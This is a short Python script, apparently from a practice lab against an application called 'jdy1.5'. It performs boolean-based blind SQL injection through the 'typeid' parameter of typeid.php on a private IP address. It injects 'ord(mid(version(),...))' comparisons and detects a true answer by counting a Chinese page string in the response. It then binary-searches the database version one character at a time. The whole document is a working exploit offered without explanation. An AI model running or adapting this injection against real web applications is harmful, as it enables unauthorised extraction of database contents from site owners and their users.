````
import requests
import re

url = 'http://192.168.110.9/jdy1.5/typeid.php'


def sendMsg(cecnum,tetnum):

	pattern = re.compile(r'产品展示') #自己判定

	tet = '2 and ord(mid(version(),'+ str(cecnum) +',1))>' + str(tetnum)

	payload = {'typeid':tet}

	r = requests.get(url,params=payload)

	r.encoding = 'gbk'

	result = pattern.findall(r.text)

	if len(result) == 4:  #自己判定

		return 1

	else:

		return 0

def judge(cecnum):

	left  = 0

	right = 128

	while True:

		tt = (right - left)//2

		if sendMsg(cecnum,left+tt) == 1 :

			left = left + tt

		else:

			right = right - tt

		if (right - left == 1 ):

			return right

flag = ''

for i in range(1,200):

	flag+=chr(judge(i))

	if ord(flag[-1]) == 1:

		break

	print(flag)

````
